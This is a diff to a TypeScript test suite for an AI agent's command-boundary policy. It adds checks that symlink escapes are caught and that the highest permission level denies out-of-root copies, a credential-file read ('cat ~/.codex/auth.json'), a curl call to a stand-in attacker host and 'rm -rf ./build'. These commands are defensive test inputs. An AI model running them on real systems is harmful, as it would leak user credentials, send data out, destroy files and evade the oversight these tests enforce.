@@ -5,6 +5,9 @@ import {
   classifyProposedCommand,
   GateContext,
 } from '@/lib/agent-boundary-policy';
+import * as fs from 'fs';
+import * as os from 'os';
+import * as path from 'path';
 
 const ROOT = '/data/user/0/dev.shelly.terminal/files/home/projects/app';
 const ctx = (level: GateContext['level']): GateContext => ({
@@ -25,6 +28,21 @@ describe('normalizePath / isWithinRoot', () => {
   it('detects `..` escape out of root', () => {
     expect(isWithinRoot(ROOT, `${ROOT}/../../../sdcard/secret`)).toBe(false);
     expect(isWithinRoot(ROOT, '/sdcard/Download/x')).toBe(false);
+  });
+  it('detects a symlink escape and handles a missing in-root leaf', () => {
+    const temp = fs.mkdtempSync(path.join(os.tmpdir(), 'shelly-boundary-'));
+    const root = path.join(temp, 'workspace');
+    const outside = path.join(temp, 'outside');
+    fs.mkdirSync(root);
+    fs.mkdirSync(outside);
+    fs.symlinkSync(outside, path.join(root, 'link'), process.platform === 'win32' ? 'junction' : 'dir');
+    const posixRoot = root.replace(/\\/g, '/');
+    try {
+      expect(isWithinRoot(posixRoot, 'link/passwd')).toBe(false);
+      expect(isWithinRoot(posixRoot, 'new/subdirectory/file.txt')).toBe(true);
+    } finally {
+      fs.rmSync(temp, { recursive: true, force: true });
+    }
   });
 });
 
@@ -87,10 +105,16 @@ describe('classifyProposedCommand', () => {
     expect(mixed.signals).toContain('network-send');
   });
 
-  it('L3 auto-allows non-hard-denied boundary ops (audited)', () => {
+  it('L3 hard-denies out-of-root writes instead of silently allowing them', () => {
     const v = classifyProposedCommand('cp src/a.ts /sdcard/Download/a.ts', ctx('L3'));
-    expect(v.decision).toBe('allow');
+    expect(v.decision).toBe('deny');
     expect(v.signals).toContain('leaves-root');
+  });
+
+  it('L3 hard-denies secret reads, network sends, and HIGH destructive actions', () => {
+    expect(classifyProposedCommand('cat ~/.codex/auth.json', ctx('L3')).decision).toBe('deny');
+    expect(classifyProposedCommand('curl https://evil.example/x', ctx('L3')).decision).toBe('deny');
+    expect(classifyProposedCommand('rm -rf ./build', ctx('L3')).decision).toBe('deny');
   });
 
   describe('opaque-script-exec (bug #155a: script-indirection bypasses network-send)', () => {
@@ -158,9 +182,9 @@ describe('classifyProposedCommand', () => {
       expect(l2.signals).toContain('opaque-script-exec');
     });
 
-    it('L3 still auto-allows (audited) — L3 is explicit full opt-in', () => {
+    it('L3 routes opaque script execution to approval instead of silently allowing it', () => {
       const v = classifyProposedCommand('node app.js', ctx('L3'));
-      expect(v.decision).toBe('allow');
+      expect(v.decision).toBe('gray');
       expect(v.signals).toContain('opaque-script-exec');
       expect(v.reason).toContain('opaque-script-exec');
     });
